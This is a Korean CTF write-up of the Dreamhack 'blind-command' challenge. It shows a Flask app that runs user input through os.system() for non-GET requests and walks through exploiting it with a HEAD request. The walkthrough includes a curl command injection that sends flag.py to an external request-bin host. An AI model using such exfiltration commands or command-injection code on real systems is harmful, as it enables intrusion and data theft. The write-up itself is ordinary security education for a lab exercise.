# [Dreamhack Wargame] blind-command.md
### [🚩blind-command](https://dreamhack.io/wargame/challenges/73/)
  <img width="1069" alt="blind command_description" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/1a0f8c65-a5c1-4d5b-b35d-258070bdd644">

<br/><br/>

## 문제 파일(app.py) 분석
```python
#!/usr/bin/env python3
from flask import Flask, request
import os

app = Flask(__name__)

# 인덱스 페이지
@app.route('/' , methods=['GET'])
def index():
    cmd = request.args.get('cmd', '') # 이용자가 전달한 cmd를 가져옴
    if not cmd: # cmd 값이 없을 경우
        return "?cmd=[cmd]"

    if request.method == 'GET': # GET 메소드로 요청 시
        '' # 아무것도 출력하지 않음
    else: # GET 메소드 외에 서버에서 허용하는 메소드로 요청 시
        os.system(cmd) # cmd의 명령을 실햄항 (command injection)
    return cmd # 화면에 cmd 입력값을 그대로 출력함

app.run(host='0.0.0.0', port=8000)
```

<br/><br/>

## 문제 풀이
### 취약점이 존재하는 코드
GET 메소드 외에 서버에서 허용하는 메소드로 cmd를 요청하면 os.system()으로 이용자의 입력값으로 받아온 cmd가 실행됨
* Reqeust를 조작하여 OPTION 메소드로 웹 서버에 요청해 서버가 허용하는 메소드를 확인하는 과정이 필요함

<br/><br/>

### 익스플로잇
1. Burp Suite를 이용해 OPTION 메소드로 Request를 전송한 결과로 받은 Response를 보면 OPTIONS, HEAD, GET이 허용됨을 확인할 수 있음
  <img width="1450" alt="OPTIONS method" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/60275a1d-39d3-4960-9645-ebdb12ac8151"><br/>
    - GET 메소드가 아니어야 하기 때문에 HEAD 메소드를 사용함

2. 외부에 있는 웹 서버로 flag.py 파일 실행 결과를 전송해야 하기 때문에 외부 웹 서버를 준비시키고, 문제 사이트의 URL에서 cmd의 값을 ```curl https://hjvreie.request.dreamhack.games/ -d "$(cat flag.py)"```으로 하고 새로고침함
  <img width="925" alt="Request Packet " src="https://github.com/augustf86/Today_I_Learn/assets/122844932/71ccd4d6-1e52-42b0-9c17-7a75fb5dbe57"><br/>
    - 외부 웹 서버로는 드림핵 툴즈 서비스의 Request Bin 기능을 이용했음
    - ```curl``` 명령어: 프로토콜들을 이용해 URL로 데이터를 전송하여 서버에 데이터를 보내거나 가져올 때 사용하기 위한 명령줄 도구 및 라이브러리
        - ```-d``` 옵션: (data) HTTP POST 요청 데이터 입력 (body 데이터를 입력함)
        - 위의 명령어는 해당 URL로 ```$(cat flag.py)```를 body 데이터에 담아 POST 메소드로 전송하라는 의미

3. 2번에서 전송된 Request는 GET 메소드로 보낸 것으로, 이 Request를 Burp Suite의 Repeater 기능에서 HEAD 메소드로 변경하여 재전송함
  <img width="1450" alt="Repeater-HEAD method" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/fa4a693f-54fc-4ec4-9112-d5489a7ca736">

4. Request Bin을 확인하면 Body에서 FLAG 확인할 수 있음
  <img width="1543" alt="blind command_result" src="https://github.com/augustf86/Today_I_Learn/assets/122844932/6be53c4b-2240-410f-897c-45d62f0cde60">

